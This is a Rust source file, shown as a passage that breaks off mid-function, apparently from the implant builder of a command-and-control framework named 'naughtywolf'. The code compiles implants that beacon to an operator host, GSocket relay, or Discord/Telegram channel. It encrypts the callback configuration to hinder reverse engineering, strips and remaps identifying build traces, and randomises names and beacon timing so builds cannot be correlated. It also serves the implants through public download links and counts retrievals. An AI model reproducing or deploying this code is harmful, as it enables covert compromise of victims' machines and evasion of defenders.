use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{LazyLock, Mutex};

use anyhow::{Context, Result};
use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use serde::{Deserialize, Serialize};
use tokio::process::Command;
use uuid::Uuid;

const PAYLOAD_DIR: &str = "./payloads";

#[derive(Deserialize, Clone, Debug, Default, PartialEq, Eq)]
pub struct BuildRequest {
    pub name: String,
    pub lhost: String,
    #[serde(default)]
    pub lport: u16,
    pub protocol: String,
    #[serde(default)]
    pub gsocket_secret: Option<String>,
    #[serde(default)]
    pub gsocket_local_port: Option<u16>,
    /// Chat-channel beacon bot token. Discord and Telegram endpoints are
    /// `<token>@<channel>` and carry no port, so they are captured separately
    /// from `lhost`/`lport`.
    #[serde(default)]
    pub chat_token: Option<String>,
    /// Chat-channel beacon address: Discord channel id or Telegram chat id.
    #[serde(default)]
    pub chat_address: Option<String>,
    pub os: String,
    pub arch: String,
    #[serde(default)]
    pub interval_ms: u64,
    #[serde(default)]
    pub jitter_ms: u64,
    /// Rust target triple. Empty means "build for the host".
    #[serde(default)]
    pub target: String,
    /// Build-time hardening. Absent means the hardened default; `false`
    /// selects cargo's stock release profile so the difference is measurable.
    #[serde(default)]
    pub harden: bool,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct PayloadMeta {
    pub file: String,
    pub name: String,
    pub os: String,
    pub arch: String,
    pub protocol: String,
    pub lhost: String,
    pub lport: u16,
    #[serde(default)]
    pub interval_ms: u64,
    #[serde(default)]
    pub jitter_ms: u64,
    #[serde(default)]
    pub target: String,
    #[serde(default)]
    pub public_id: String,
    pub size: u64,
    pub built_at: String,
    /// Times the public download token was actually served. Absent on sidecars
    /// written before retrieval tracking existed.
    #[serde(default)]
    pub retrievals: u32,
    #[serde(default)]
    pub first_retrieved_at: Option<String>,
    #[serde(default)]
    pub last_retrieved_at: Option<String>,
    /// Result of the post-build fingerprint scan, so the library can report
    /// what a build leaked without re-reading every artifact on each page load.
    #[serde(default)]
    pub fingerprint: Option<FingerprintReport>,
}

impl PayloadMeta {
    /// True once any retrieval has been observed for this artifact.
    pub fn was_retrieved(&self) -> bool {
        self.retrievals > 0 || self.first_retrieved_at.is_some()
    }
}

/// A build currently running in the background, surfaced to the loading screen.
#[derive(Serialize, Clone, Debug)]
pub struct BuildJob {
    pub file: String,
    pub name: String,
    pub target: String,
    pub os: String,
    pub arch: String,
    pub started_at: String,
}

static BUILDING: LazyLock<Mutex<HashMap<String, BuildJob>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

pub fn mark_building(job: BuildJob) {
    if let Ok(mut map) = BUILDING.lock() {
        map.insert(job.file.clone(), job);
    }
}

pub fn unmark_building(file: &str) {
    if let Ok(mut map) = BUILDING.lock() {
        map.remove(file);
    }
}

pub fn building_jobs() -> Vec<BuildJob> {
    BUILDING
        .lock()
        .map(|map| {
            let mut v: Vec<BuildJob> = map.values().cloned().collect();
            v.sort_by(|a, b| b.started_at.cmp(&a.started_at));
            v
        })
        .unwrap_or_default()
}

pub fn is_building(file: &str) -> bool {
    BUILDING
        .lock()
        .map(|map| map.contains_key(file))
        .unwrap_or(false)
}

/// `(file, error, at)` for recent failed builds, surfaced in the payload UI.
static RECENT_ERRORS: LazyLock<Mutex<Vec<(String, String, String)>>> =
    LazyLock::new(|| Mutex::new(Vec::new()));
static PAYLOAD_METADATA_LOCK: LazyLock<Mutex<()>> = LazyLock::new(|| Mutex::new(()));

#[cfg(test)]
#[derive(Default)]
struct PublicDownloadIndex {
    loaded: bool,
    entries: HashMap<Uuid, (PathBuf, String)>,
}

#[cfg(test)]
impl PublicDownloadIndex {
    fn replace(&mut self, dir: &Path, metadata: &[PayloadMeta]) {
        self.entries.clear();
        for meta in metadata {
            if let Some(public_id) = valid_public_uuid(&meta.public_id) {
                self.entries
                    .insert(public_id, (dir.join(&meta.file), meta.file.clone()));
            }
        }
        self.loaded = true;
    }

    fn resolve(&self, token: &str) -> Option<(PathBuf, String)> {
        let public_id = valid_public_uuid(token)?;
        self.entries.get(&public_id).cloned()
    }
}

/// Remove a built payload (binary + sidecar) for good.
pub fn delete(file: &str) -> Result<()> {
    delete_from_dir(Path::new(PAYLOAD_DIR), file)
}

fn delete_from_dir(dir: &Path, file: &str) -> Result<()> {
    let known = list_from_dir(dir)?.iter().any(|meta| meta.file == file);
    anyhow::ensure!(known, "payload not found");
    anyhow::ensure!(!is_building(file), "payload is still building");
    let _guard = PAYLOAD_METADATA_LOCK
        .lock()
        .map_err(|_| anyhow::anyhow!("payload metadata lock poisoned"))?;
    let binary = dir.join(file);
    std::fs::remove_file(&binary)?;
    let _ = std::fs::remove_file(dir.join(format!("{file}.json")));
    clear_build_errors(file);
    Ok(())
}

pub fn record_build_error(file: &str, err: &str) {
    if let Ok(mut v) = RECENT_ERRORS.lock() {
        v.retain(|(f, _, _)| f != file);
        v.insert(
            0,
            (
                file.to_owned(),
                err.to_owned(),
                chrono::Utc::now().to_rfc3339(),
            ),
        );
        v.truncate(10);
    }
}

pub fn clear_build_errors(file: &str) {
    if let Ok(mut v) = RECENT_ERRORS.lock() {
        v.retain(|(f, _, _)| f != file);
    }
}

pub fn recent_errors() -> Vec<(String, String, String)> {
    RECENT_ERRORS.lock().map(|v| v.clone()).unwrap_or_default()
}

/// The output file name a request will produce, without building.
pub fn predict_file(req: &BuildRequest) -> String {
    let name = if sanitize(&req.name).is_empty() {
        "implant".to_owned()
    } else {
        sanitize(&req.name)
    };
    build_id(&name, &req.os, &req.arch)
}

/// Build-time hardening applied to the emitted artifact.
///
/// Each setting maps to something an analyst can find in the shipped binary.
/// They are grouped so a caller can ask for "strip everything" without having to
/// remember which individual knobs matter.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Obfuscation {
    /// Drop the symbol table and DWARF. Without this, every function of every
    /// dependency (`tokio::runtime::...`, `reqwest::...`) is a named symbol.
    pub strip_symbols: bool,
    /// Replace build-time file paths with a per-build fake prefix. Rust bakes
    /// absolute source paths into panic locations, which otherwise leak the
    /// operator's username and directory layout into the artifact.
    pub remap_paths: bool,
    /// `panic = "abort"`. Removes unwinding tables and shrinks the artifact.
    pub panic_abort: bool,
    /// Link-time optimization; collapses cross-crate call structure.
    pub lto: bool,
    /// `codegen-units = 1` so the binary is one unit, which removes the
    /// per-codegen-unit partition boundaries that are stable fingerprints.
    pub single_codegen_unit: bool,
    /// Randomize `-C metadata`, the per-build crate disambiguator that
    /// otherwise keeps symbol hashes stable across identical builds.
    pub randomize_metadata: bool,
}

impl Default for Obfuscation {
    /// Hardened: this is the default for every build the platform produces.
    fn default() -> Self {
        Self {
            strip_symbols: true,
            remap_paths: true,
            panic_abort: true,
            lto: true,
            single_codegen_unit: true,
            randomize_metadata: true,
        }
    }
}

impl Obfuscation {
    /// No hardening beyond cargo's release defaults.
    pub const fn none() -> Self {
        Self {
            strip_symbols: false,
            remap_paths: false,
            panic_abort: false,
            lto: false,
            single_codegen_unit: false,
            randomize_metadata: false,
        }
    }

    /// Cargo reads `CARGO_PROFILE_RELEASE_*` from the environment, so the
    /// release profile can be tuned for one build without editing any file.
    fn profile_env(&self) -> Vec<(&'static str, String)> {
        let mut env = Vec::new();
        if self.lto {
            env.push(("CARGO_PROFILE_RELEASE_LTO", "true".to_owned()));
        }
        if self.panic_abort {
            env.push(("CARGO_PROFILE_RELEASE_PANIC", "abort".to_owned()));
        }
        if self.strip_symbols {
            env.push(("CARGO_PROFILE_RELEASE_STRIP", "symbols".to_owned()));
        }
        if self.single_codegen_unit {
            env.push(("CARGO_PROFILE_RELEASE_CODEGEN_UNITS", "1".to_owned()));
        }
        env
    }

    /// Flags that only rustc accepts.
    ///
    /// The prefixes are remapped one by one rather than as a single `/` rule.
    /// Remapping `/` only strips the leading separator: an artifact built that
    /// way still reads `<fake>/Users/<name>/projects/<repo>/...`, which leaks
    /// both the operator's username and the repository name. rustc applies the
    /// longest matching prefix, so remapping each real root in turn replaces
    /// the whole path.
    fn rustflags(&self, rng: &mut StdRng, roots: &[(String, String)]) -> Vec<String> {
        let mut flags = Vec::new();
        if self.remap_paths {
            for (real, fake) in roots {
                if real.starts_with('/') && !real.is_empty() {
                    flags.push(format!("--remap-path-prefix={real}={fake}"));
                }
            }
        }
        if self.randomize_metadata {
            let hash: u64 = rng.r#gen();
            flags.push(format!("-Cmetadata={hash:016x}"));
        }
        flags
    }

    /// Everything to layer onto a cargo invocation. Kept separate from
    /// [`crate::payload::build`] so it can be unit tested without compiling.
    pub fn applied(self, rng: &mut StdRng, roots: &[(String, String)]) -> Vec<(String, String)> {
        let mut env: Vec<(String, String)> = self
            .profile_env()
            .into_iter()
            .map(|(key, value)| (key.to_owned(), value))
            .collect();
        let flags = self.rustflags(rng, roots);
        if !flags.is_empty() {
            // Append rather than replace so a caller's existing RUSTFLAGS
            // survive; cargo treats this as one concatenated value.
            let mut value = std::env::var("RUSTFLAGS").unwrap_or_default();
            if !value.is_empty() {
                value.push(' ');
            }
            value.push_str(&flags.join(" "));
            env.push(("RUSTFLAGS".to_owned(), value));
        }
        env
    }
}

/// Absolute source roots that get baked into panic locations, longest first.
///
/// rustc takes the longest matching prefix, so ordering only affects readability
/// of the flag list, not the result. Both roots are removed entirely rather than
/// partially, because a partially-remapped path still names the operator.
pub fn sensitive_path_roots() -> Vec<String> {
    let mut roots = Vec::new();
    // The workspace itself: reveals the repository name and directory layout.
    roots.push(env!("CARGO_MANIFEST_DIR").to_owned());
    if let Ok(home) = std::env::var("CARGO_HOME") {
        roots.push(home);
    } else if let Ok(home) = std::env::var("HOME") {
        roots.push(format!("{home}/.cargo"));
        roots.push(home);
    }
    roots.sort_by_key(|root| std::cmp::Reverse(root.len()));
    roots.dedup();
    roots
}

/// Pairs each sensitive root with a distinct fake root.
fn remap_pairs(rng: &mut StdRng) -> Vec<(String, String)> {
    sensitive_path_roots()
        .into_iter()
        .enumerate()
        .map(|(index, real)| (real, fake_path_prefix(rng, index)))
        .collect()
}

/// A plausible-looking, non-identifying source root for `--remap-path-prefix`.
fn fake_path_prefix(rng: &mut StdRng, index: usize) -> String {
    const WORDS: [&str; 8] = [
        "src",
        "build",
        "pkg",
        "core",
        "vendor",
        "toolchain",
        "mod",
        "sys",
    ];
    let word = WORDS[(rng.r#gen::<usize>()) % WORDS.len()];
    let number: u32 = rng.r#gen();
    // A distinct fake root per real root, so the remapped artifact does not
    // accidentally show that two directories were collapsed into one.
    format!("/{word}{index}/r{number:08x}")
}

/// What a scan of a finished artifact found.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct FingerprintReport {
    pub bytes_scanned: u64,
    /// Absolute build paths left in the artifact.
    pub build_paths: Vec<String>,
    /// Project-identifying literals.
    pub project_strings: Vec<String>,
    /// Dependency symbol fragments from a retained symbol table.
    pub dependency_symbols: Vec<String>,
}

impl FingerprintReport {
    /// True when nothing recognizable survived into the artifact.
    pub fn is_clean(&self) -> bool {
        self.build_paths.is_empty()
            && self.project_strings.is_empty()
            && self.dependency_symbols.is_empty()
    }

    pub fn summary(&self) -> String {
        format!(
            "build_paths={} project_strings={} dependency_symbols={}",
            self.build_paths.len(),
            self.project_strings.len(),
            self.dependency_symbols.len()
        )
    }
}

const PATH_MARKERS: [&str; 6] = [
    "/Users/",
    "/home/",
    "/private/var/folders",
    r"\\?\C:",
    "/root/",
    "/tmp/cargo",
];
const PROJECT_MARKERS: [&str; 5] = [
    "naughtywolf",
    "nw-implant",
    "nw_implant",
    "cargo/registry",
    "rustc/",
];
const SYMBOL_MARKERS: [&str; 4] = ["tokio::", "reqwest::", "hyper::", "serde_json::"];

/// Scans a built artifact for strings that give it away.
///
/// This exists so hardening is measurable rather than assumed: run it against
/// two builds, one hardened and one not, and the difference is the answer to
/// "did that actually do anything".
pub fn fingerprint_scan(path: &Path) -> Result<FingerprintReport, String> {
    let bytes = std::fs::read(path).map_err(|error| error.to_string())?;
    let haystack = String::from_utf8_lossy(&bytes);
    let mut report = FingerprintReport {
        bytes_scanned: bytes.len() as u64,
        ..FingerprintReport::default()
    };
    for marker in PATH_MARKERS {
        if haystack.contains(marker) {
            report.build_paths.push(marker.to_owned());
        }
    }
    for marker in PROJECT_MARKERS {
        if haystack.to_lowercase().contains(&marker.to_lowercase()) {
            report.project_strings.push(marker.to_owned());
        }
    }
    // Symbol fragments only matter when a symbol table survived; a stripped
    // artifact still contains dependency *code*, just not dependency *names*.
    for marker in SYMBOL_MARKERS {
        if haystack.contains(marker) {
            report.dependency_symbols.push(marker.to_owned());
        }
    }
    Ok(report)
}

/// Upper bound on variants a single randomize request may ask for. Building is
/// a cargo invocation per variant, so an unbounded count would let one form
/// submission occupy the machine for an unbounded time.
pub const MAX_RANDOM_VARIANTS: usize = 12;

/// Deterministic cap used when jitter exceeds the interval. A jitter larger
/// than the base interval produces non-monotonic behaviour in the implant and
/// hides the configured cadence, so the builder clamps rather than emitting it.
pub fn effective_jitter(interval_ms: u64, jitter_ms: u64) -> u64 {
    if interval_ms == 0 {
        0
    } else {
        jitter_ms.min(interval_ms)
    }
}

/// Produces build variants that differ in artifact identity and beacon cadence,
/// so a fleet of builds is not trivially correlatable by filename, size, or a
/// single shared timing value.
///
/// `seed` makes the whole batch reproducible, which is what the tests rely on;
/// `None` uses entropy. Variants keep the operator's endpoint and protocol: the
/// randomization applies to artifact identity and timing, never to where a build
/// will connect.
pub fn randomize(req: &BuildRequest, count: usize, seed: Option<u64>) -> Vec<BuildRequest> {
    use rand::{Rng, SeedableRng};

    let count = count.clamp(1, MAX_RANDOM_VARIANTS);
    let mut rng = match seed {
        Some(seed) => rand::rngs::StdRng::seed_from_u64(seed),
        None => rand::rngs::StdRng::from_entropy(),
    };
    let base_interval = req.interval_ms.max(1);

    (0..count)
        .map(|_| {
            // Six lowercase hex characters is enough to keep names distinct
            // without making the artifact name itself a long random string.
            let suffix: String = (0..6)
                .map(|_| {
                    let nibble = rng.r#gen::<u8>() & 0x0f;
                    std::char::from_digit(nibble as u32, 16).unwrap_or('0')
                })
                .collect();
            // Space the interval over [base, 2*base] and jitter over [0, interval]
            // so every variant stays inside a sane, self-consistent cadence.
            let interval_ms = base_interval + rng.r#gen_range(0..=base_interval);
            let jitter_ms = rng.r#gen_range(0..=interval_ms);
            let stem = if sanitize(&req.name).is_empty() {
                "implant".to_owned()
            } else {
                sanitize(&req.name)
            };
            BuildRequest {
                name: format!("{stem}-{suffix}"),
                lhost: req.lhost.clone(),
                lport: req.lport,
                protocol: req.protocol.clone(),
                gsocket_secret: req.gsocket_secret.clone(),
                gsocket_local_port: req.gsocket_local_port,
                chat_token: req.chat_token.clone(),
                chat_address: req.chat_address.clone(),
                os: req.os.clone(),
                arch: req.arch.clone(),
                interval_ms,
                jitter_ms: effective_jitter(interval_ms, jitter_ms),
                target: req.target.clone(),
                harden: req.harden,
            }
        })
        .collect()
}

fn sanitize(name: &str) -> String {
    name.chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
        .collect::<String>()
        .trim_matches('-')
        .to_owned()
}

/// Output path of the freshly built implant for the given (possibly empty) target triple.
fn built_binary(target: &str) -> PathBuf {
    let workspace = env!("CARGO_MANIFEST_DIR");
    let exe = if target.contains("windows") {
        ".exe"
    } else {
        ""
    };
    if target.is_empty() {
        Path::new(workspace).join(format!("target/release/nw-implant{exe}"))
    } else {
        Path::new(workspace).join(format!("target/{target}/release/nw-implant{exe}"))
    }
}

fn build_id(name: &str, os: &str, arch: &str) -> String {
    format!("{name}.{os}.{arch}")
}

fn valid_dns_host(host: &str) -> bool {
    let host = host.strip_suffix('.').unwrap_or(host);
    !host.is_empty()
        && host.len() <= 253
        && host.split('.').all(|label| {
            !label.is_empty()
                && label.len() <= 63
                && !label.starts_with('-')
                && !label.ends_with('-')
                && label
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
        })
}

pub async fn build(req: &BuildRequest, c2_psk: &[u8]) -> Result<PayloadMeta> {
    let name = if sanitize(&req.name).is_empty() {
        "implant".to_owned()
    } else {
        sanitize(&req.name)
    };
    let file = build_id(&name, &req.os, &req.arch);
    std::fs::create_dir_all(PAYLOAD_DIR).with_context(|| format!("create {PAYLOAD_DIR}"))?;
    clear_build_errors(&file);

    mark_building(BuildJob {
        file: file.clone(),
        name: name.clone(),
        target: req.target.clone(),
        os: req.os.clone(),
        arch: req.arch.clone(),
        started_at: chrono::Utc::now().to_rfc3339(),
    });

    let result = do_build(req, c2_psk, &name, &file).await;
    unmark_building(&file);
    result
}

/// Resolve a cargo binary that can see rustup-installed cross-compilation
/// targets. Prefers an explicit override, then rustup's cargo shim
/// (`~/.cargo/bin/cargo`), then plain `cargo` on PATH.
fn cargo_bin() -> PathBuf {
    if let Ok(explicit) = std::env::var("NAUGHTYWOLF_CARGO") {
        let p = PathBuf::from(explicit);
        if p.is_file() {
            return p;
        }
    }
    if let Ok(home) = std::env::var("HOME") {
        let shim = Path::new(&home).join(".cargo/bin/cargo");
        if shim.is_file() {
            return shim;
        }
    }
    PathBuf::from("cargo")
}

fn rustc_bin() -> PathBuf {
    if let Ok(explicit) = std::env::var("NAUGHTYWOLF_RUSTC") {
        let p = PathBuf::from(explicit);
        if p.is_file() {
            return p;
        }
    }
    if let Ok(home) = std::env::var("HOME") {
        let shim = Path::new(&home).join(".cargo/bin/rustc");
        if shim.is_file() {
            return shim;
        }
    }
    PathBuf::from("rustc")
}

/// The active toolchain's `bin/rustc`, derived from `rustc --print sysroot`.
/// Forcing this on cargo makes cross-compilation targets (added via rustup) be
/// visible to the build instead of whatever `rustc` cargo otherwise auto-picks.
async fn toolchain_rustc() -> Option<PathBuf> {
    let out = Command::new(rustc_bin())
        .arg("--print")
        .arg("sysroot")
        .output()
        .await
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let sysroot = String::from_utf8(out.stdout).ok()?.trim().to_owned();
    let p = Path::new(&sysroot).join("bin/rustc");
    p.is_file().then_some(p)
}

/// Test seam: build just the endpoint config for a chat protocol, so a test
/// can assert the operator-facing string against the beacon's own parser
/// without running a toolchain build.
pub fn payload_config_for_test(
    protocol: &str,
    chat_token: Option<&str>,
    chat_address: Option<&str>,
    psk: &[u8],
) -> (nw_profile::config::PayloadConfig, String, u16) {
    payload_config(
        &BuildRequest {
            name: "chat".into(),
            lhost: String::new(),
            lport: 0,
            protocol: protocol.to_owned(),
            gsocket_secret: None,
            gsocket_local_port: None,
            chat_token: chat_token.map(str::to_owned),
            chat_address: chat_address.map(str::to_owned),
            os: "linux".into(),
            arch: "amd64".into(),
            interval_ms: 1000,
            jitter_ms: 0,
            target: String::new(),
            harden: true,
        },
        psk,
    )
    .expect("chat payload config")
}

fn payload_config(
    req: &BuildRequest,
    c2_psk: &[u8],
) -> Result<(nw_profile::config::PayloadConfig, String, u16)> {
    let psk = std::str::from_utf8(c2_psk)
        .context("the active C2 PSK is not valid UTF-8")?
        .to_owned();
    if req.protocol == "gs" {
        let secret = req
            .gsocket_secret
            .as_deref()
            .map(str::trim)
            .filter(|secret| !secret.is_empty())
            .context("GSocket secret is required")?;
        let local_port = req
            .gsocket_local_port
            .filter(|port| *port > 0)
            .unwrap_or(req.lport);
        Ok((
            nw_profile::config::PayloadConfig {
                endpoint: format!("gs://127.0.0.1:{local_port}"),
                psk,
                gsocket: Some(nw_profile::config::GSocketConfig {
                    secret: secret.to_owned(),
                    local_port,
                }),
            },
            "127.0.0.1".to_owned(),
            local_port,
        ))
    } else {
        // Chat channels carry credentials and an address rather than a host
        // and port, and their tokens are not DNS names, so they bypass the
        // host/port shape entirely.
        if req.protocol == "discord" || req.protocol == "telegram" {
            let token = req
                .chat_token
                .as_deref()
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .ok_or_else(|| {
                    anyhow::anyhow!("{} payload needs a beacon bot token", req.protocol)
                })?;
            let address = req
                .chat_address
                .as_deref()
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .ok_or_else(|| {
                    anyhow::anyhow!("{} payload needs a channel or chat id", req.protocol)
                })?;
            anyhow::ensure!(
                !token.contains('/')
                    && !token.contains('@')
                    && !token.chars().any(char::is_whitespace),
                "chat token contains characters that cannot appear in an endpoint"
            );
            anyhow::ensure!(
                !address.contains('/')
                    && !address.contains('@')
                    && !address.chars().any(char::is_whitespace),
                "chat address contains characters that cannot appear in an endpoint"
            );
            return Ok((
                nw_profile::config::PayloadConfig {
                    endpoint: format!("{}://{token}@{address}", req.protocol),
                    psk,
                    gsocket: None,
                },
                address.to_owned(),
                req.lport,
            ));
        }

        let host = req.lhost.trim();
        let parsed_ip = host.parse::<std::net::IpAddr>().ok();
        anyhow::ensure!(
            !host.is_empty()
                && !host.contains("://")
                && !host.contains('/')
                && !host.contains('?')
                && !host.contains('#')
                && !host.chars().any(char::is_whitespace),
            "callback LHost must contain the host only, without a scheme, port, or URL path"
        );
        anyhow::ensure!(
            parsed_ip.is_some() || valid_dns_host(host),
            "callback LHost must be a valid DNS name or IP address"
        );
        let endpoint_host = match parsed_ip {
            Some(std::net::IpAddr::V6(_)) => format!("[{host}]"),
            _ => host.to_owned(),
        };
        Ok((
            nw_profile::config::PayloadConfig {
                endpoint: format!("{}://{}:{}", req.protocol, endpoint_host, req.lport),
                psk,
                gsocket: None,
            },
            host.to_owned(),
            req.lport,
        ))
    }
}

/// Resolve the Rust target triple actually used for the build.
///
/// `os` and `arch` are what the operator selects in the UI and what the artifact
/// is named after, so an empty `target` must not silently fall back to the host
/// and produce a binary labelled for a platform it was never compiled for.
/// "This computer (native)" keeps the host build because it reports `current`.
fn resolve_target(os: &str, arch: &str, target: &str) -> anyhow::Result<String> {
    if !target.trim().is_empty() {
        return Ok(target.trim().to_owned());
    }
    let (os, arch) = (os.trim(), arch.trim());
    if os.is_empty() || arch.is_empty() || os.eq_ignore_ascii_case("current") {
        return Ok(String::new());
    }
    crate::portal::templates::PLATFORMS
        .iter()
        .find(|(triple, _, f_os, f_arch)| !triple.is_empty() && *f_os == os && *f_arch == arch)
        .map(|(triple, ..)| (*triple).to_owned())
        .ok_or_else(|| {
            anyhow::anyhow!("no build target is defined for {os}/{arch}; pick a listed platform")
        })
}

async fn do_build(
    req: &BuildRequest,
    c2_psk: &[u8],
    name: &str,
    file: &str,
) -> Result<PayloadMeta> {
    let (payload_config, metadata_host, metadata_port) = payload_config(req, c2_psk)?;
    let target = resolve_target(&req.os, &req.arch, &req.target)?;
    let workspace = env!("CARGO_MANIFEST_DIR");
    let bin = cargo_bin();
    let mut args = vec!["build", "--release", "-p", "nw-implant"];
    if !target.is_empty() {
        // rustup target add is idempotent; ensures the toolchain has the target
        // std (needs network the first time). Failure here is non-fatal: the
        // cargo build below reports the authoritative error for the UI.
        let _ = Command::new("rustup")
            .args(["target", "add", &target])
            .status()
            .await;
        args.push("--target");
        args.push(&target);
    }
    let mut cmd = Command::new(&bin);
    if let Some(toolchain) = toolchain_rustc().await {
        // Tie cargo to the rustup toolchain's rustc so cross std links up.
        cmd.env("RUSTC", &toolchain);
    }
    if req.harden {
        // Seeded per build so two identical requests still produce binaries
        // that differ in remapped path prefix and crate metadata.
        let mut rng = StdRng::from_entropy();
        let pairs = remap_pairs(&mut rng);
        for (key, value) in Obfuscation::default().applied(&mut rng, &pairs) {
            cmd.env(key, value);
        }
    }
    // Bake the endpoint/PSK as an encrypted blob so the callback isn't a
    // plaintext string in the binary (anti-RE).
    let cfg_blob = nw_profile::config::encrypt_payload_config(&payload_config)?;
    let status = cmd
        .current_dir(workspace)
        .args(&args)
        .env("NW_CFG", &cfg_blob)
        .env("NW_INTERVAL", req.interval_ms.to_string())
        .env("NW_JITTER", req.jitter_ms.to_string())
        .status()
        .await
        .context("failed to spawn cargo build")?;
    anyhow::ensure!(status.success(), "implant build failed with {status}");

    let built = built_binary(&target);
    let dest = PathBuf::from(PAYLOAD_DIR).join(file);
    publish_artifact(&built, &dest).await?;

    let mut meta = PayloadMeta {
        file: file.to_owned(),
        name: name.to_owned(),
        os: req.os.clone(),
        arch: req.arch.clone(),
        protocol: req.protocol.clone(),
        lhost: metadata_host,
        lport: metadata_port,
        interval_ms: req.interval_ms,
        jitter_ms: req.jitter_ms,
        target: target.clone(),
        public_id: Uuid::new_v4().to_string(),
        size: std::fs::metadata(&dest).map(|m| m.len()).unwrap_or(0),
        built_at: chrono::Utc::now().to_rfc3339(),
        retrievals: 0,
        first_retrieved_at: None,
        last_retrieved_at: None,
        fingerprint: None,
    };
    // Scan before storing so the library can report what this build exposed.
    meta.fingerprint = fingerprint_scan(&dest).ok();
    store_payload_metadata(Path::new(PAYLOAD_DIR), &mut meta)?;
    Ok(meta)
}

pub fn list() -> Result<Vec<PayloadMeta>> {
    list_from_dir(Path::new(PAYLOAD_DIR))
}

fn list_from_dir(dir: &Path) -> Result<Vec<PayloadMeta>> {
    if !dir.exists() {
        return Ok(Vec::new());
    }
    let _guard = PAYLOAD_METADATA_LOCK
        .lock()
        .map_err(|_| anyhow::anyhow!("payload metadata lock poisoned"))?;
    let mut out = Vec::new();
    for entry in std::fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        let fname = entry.file_name().to_string_lossy().to_string();
        if path
            .extension()
            .is_some_and(|extension| extension == "json" || extension == "tmp")
        {
            continue;
        }
        let sidecar = dir.join(format!("{fname}.json"));
        let (mut meta, contained_legacy_psk) = if sidecar.exists() {
            let bytes = std::fs::read(&sidecar)?;
            let contained_legacy_psk = serde_json::from_slice::<serde_json::Value>(&bytes)
                .ok()
                .and_then(|value| value.as_object().map(|object| object.contains_key("psk")))
                .unwrap_or(false);
            (
                serde_json::from_slice::<PayloadMeta>(&bytes)
                    .unwrap_or_else(|_| fallback_meta(&fname, &path)),
                contained_legacy_psk,
            )
        } else {
            (fallback_meta(&fname, &path), false)
        };
        meta.file = fname;
        let public_id = valid_public_uuid(&meta.public_id)
            .unwrap_or_else(Uuid::new_v4)
            .to_string();
        if meta.public_id != public_id || contained_legacy_psk {
            meta.public_id = public_id;
            write_metadata_atomic(&sidecar, &meta)?;
        }
        out.push(meta);
    }
    out.sort_by(|a, b| b.built_at.cmp(&a.built_at));
    Ok(out)
}

fn valid_public_uuid(value: &str) -> Option<Uuid> {
    Uuid::parse_str(value)
        .ok()
        .filter(|id| id.get_version() == Some(uuid::Version::Random))
}

fn store_payload_metadata(dir: &Path, meta: &mut PayloadMeta) -> Result<()> {
    let _guard = PAYLOAD_METADATA_LOCK
        .lock()
        .map_err(|_| anyhow::anyhow!("payload metadata lock poisoned"))?;
    let sidecar = dir.join(format!("{}.json", meta.file));
    let existing_id = std::fs::read(&sidecar)
        .ok()
        .and_then(|bytes| serde_json::from_slice::<PayloadMeta>(&bytes).ok())
        .and_then(|existing| valid_public_uuid(&existing.public_id));
    let public_id = existing_id
        .or_else(|| valid_public_uuid(&meta.public_id))
        .unwrap_or_else(Uuid::new_v4);
    meta.public_id = public_id.to_string();
    write_metadata_atomic(&sidecar, meta)
}

fn write_metadata_atomic(sidecar: &Path, meta: &PayloadMeta) -> Result<()> {
    let temporary = sidecar.with_extension(format!("json.{}.tmp", Uuid::new_v4()));
    std::fs::write(&temporary, serde_json::to_vec_pretty(meta)?)?;
    if let Err(error) = std::fs::rename(&temporary, sidecar) {
        let _ = std::fs::remove_file(&temporary);
        return Err(error.into());
    }
    Ok(())
}

async fn publish_artifact(source: &Path, destination: &Path) -> Result<()> {
    let directory = destination
        .parent()
        .context("payload destination has no parent directory")?;
    let filename = destination
        .file_name()
        .context("payload destination has no filename")?
        .to_string_lossy();
    let temporary = directory.join(format!(".{filename}.{}.tmp", Uuid::new_v4()));
    if let Err(error) = tokio::fs::copy(source, &temporary).await {
        let _ = tokio::fs::remove_file(&temporary).await;
        return Err(error)
            .with_context(|| format!("copy built implant to temporary file {temporary:?}"));
    }
    if let Err(error) = tokio::fs::rename(&temporary, destination).await {
        let _ = tokio::fs::remove_file(&temporary).await;
        return Err(error).with_context(|| format!("publish built implant at {destination:?}"));
    }
    Ok(())
}

fn fallback_meta(fname: &str, path: &Path) -> PayloadMeta {
    PayloadMeta {
        file: fname.to_owned(),
        name: fname.to_owned(),
        os: "unknown".into(),
        arch: "unknown".into(),
        protocol: "unknown".into(),
        lhost: "unknown".into(),
        lport: 0,
        interval_ms: 0,
        jitter_ms: 0,
        target: String::new(),
        public_id: String::new(),
        size: std::fs::metadata(path).map(|m| m.len()).unwrap_or(0),
        built_at: chrono::Utc::now().to_rfc3339(),
        retrievals: 0,
        first_retrieved_at: None,
        last_retrieved_at: None,
        fingerprint: None,
    }
}

pub fn download_path(file: &str) -> Option<PathBuf> {
    let candidate = PathBuf::from(PAYLOAD_DIR).join(file);
    if candidate.is_file() {
        Some(candidate)
    } else {
        None
    }
}

/// Records that a public download token was actually served.
///
/// This runs on the unauthenticated download path, which is deliberately kept
/// free of database state, so the ledger lives in the metadata sidecar under
/// the same lock that serializes metadata writes. A counter is enough to answer
/// the operator question this exists for: has any callback actually fetched this
/// artifact, and if so how often.
pub fn record_retrieval(file: &str) -> Result<()> {
    let dir = Path::new(PAYLOAD_DIR);
    // Artifact filenames legitimately contain dots (`{name}.{os}.{arch}`), so
    // the guard is about separators and traversal, not the name sanitizer.
    if file.is_empty()
        || file.len() > 255
        || file.contains('/')
        || file.contains('\\')
        || file.contains("..")
        || file.chars().any(char::is_control)
    {
        return Err(anyhow::anyhow!("invalid payload file name"));
    }
    let sidecar = dir.join(format!("{file}.json"));
    if !dir.join(file).is_file() {
        return Err(anyhow::anyhow!("payload artifact is missing"));
    }

    let _guard = PAYLOAD_METADATA_LOCK
        .lock()
        .map_err(|_| anyhow::anyhow!("payload metadata lock poisoned"))?;
